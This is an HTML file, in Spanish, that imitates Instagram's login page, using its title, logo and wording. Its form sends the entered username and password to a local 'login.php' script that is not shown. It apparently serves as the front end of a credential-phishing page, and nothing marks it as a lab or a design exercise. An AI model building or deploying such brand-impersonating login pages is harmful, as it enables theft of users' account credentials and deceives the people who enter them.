<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Iniciar sesión - Instagram</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <div class="login-container">
        <div class="login-box">
            <!-- Logo de Instagram -->
            <div class="logo-container">
                <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Logo" class="logo">
            </div>
            
            <!-- Formulario de inicio de sesión -->
            <form action="login.php" method="POST">
                <div class="input-group">
                    <input type="text" name="username" id="username" placeholder="Número de teléfono, usuario o correo electrónico" required>
                </div>
                <div class="input-group">
                    <input type="password" name="password" id="password" placeholder="Contraseña" required>
                </div>
                <button type="submit" class="login-btn">Iniciar sesión</button>
                <!-- Enlace para olvidó la contraseña -->
                <div class="forgot-password">
                    <a href="#">¿Olvidaste tu contraseña?</a>
                </div>
            </form>
        </div>

        <!-- Sección de registro -->
        <div class="signup-container">
            <p>¿No tienes cuenta?</p>
            <a href="#" class="signup-btn">Crear cuenta nueva</a>
        </div>

        <!-- Pie de página con enlace a la app -->
        <div class="footer">
            <p>Instagram te ofrece la posibilidad de iniciar sesión con tu número de teléfono, correo electrónico o cuenta de Facebook.</p>
        </div>
    </div>
</body>
</html>
